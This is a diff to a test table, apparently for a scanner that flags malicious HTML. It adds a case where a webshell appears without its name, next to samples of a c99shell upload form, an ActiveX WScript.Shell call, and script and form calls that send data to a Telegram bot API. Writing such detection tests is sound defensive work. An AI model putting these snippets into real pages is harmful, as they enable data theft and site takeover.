@@ -18,6 +18,7 @@ var attacks = []struct {
 	{"mixed-content", "mixed-content", `<img src="http://inject.example/a.png">`, false},
 	{"sri-missing", "sri-missing", `<script src="https://inject-cdn.example/a.js"></script>`, false},
 	{"webshell", "webshell-signature", `<p>c99shell</p><form><input type="file" name="f"></form>`, false},
+	{"webshell-nameless", "webshell-signature", `<p>Safe-mode: OFF</p><pre>drwxr-xr-x .</pre><form><input type="file" name="f"></form>`, false},
 	{"local-object", "local-system-object", `<script>var s = new ActiveXObject("WScript.Shell");</script>`, false},
 	{"exfil-script", "exfil-channel", `<script>fetch("https://api.telegram.org/botX/sendMessage")</script>`, false},
 	{"exfil-form", "exfil-channel", `<form action="https://api.telegram.org/botX/sendMessage"><input name="m"></form>`, false},
